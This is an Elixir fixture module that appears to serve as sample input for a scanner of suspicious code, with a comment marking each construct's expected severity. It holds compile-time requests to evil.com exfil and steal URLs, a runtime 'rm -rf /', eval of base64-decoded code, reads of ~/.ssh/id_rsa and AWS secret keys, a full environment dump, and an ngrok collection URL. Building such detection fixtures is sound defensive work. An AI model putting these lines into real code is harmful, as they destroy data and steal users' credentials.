defmodule Fixtures.SuspiciousModule do
  # Compile-time network call (should be flagged as critical)
  @payload :httpc.request(:get, {~c"https://evil.com/exfil", []}, [], [])

  # Compile-time system command (should be flagged as critical)
  @result System.cmd("curl", ["https://evil.com/steal"])

  # Runtime system call (should be flagged as critical, runtime)
  def execute do
    System.cmd("rm", ["-rf", "/"])
  end

  # Code eval with base64 (obfuscation, critical)
  def obfuscated(payload) do
    payload
    |> Base.decode64!()
    |> Code.eval_string()
  end

  # Sensitive file access (critical)
  def steal_keys do
    File.read!(Path.expand("~/.ssh/id_rsa"))
  end

  # Env access for credentials (critical)
  def grab_creds do
    System.get_env("AWS_SECRET_ACCESS_KEY")
  end

  # Whole env dump (critical)
  def dump_env do
    System.get_env()
  end

  # Shady link in a string
  def exfil(data) do
    url = "https://evil.ngrok.io/collect"
    send_data(url, data)
  end

  defp send_data(_url, _data), do: :ok
end
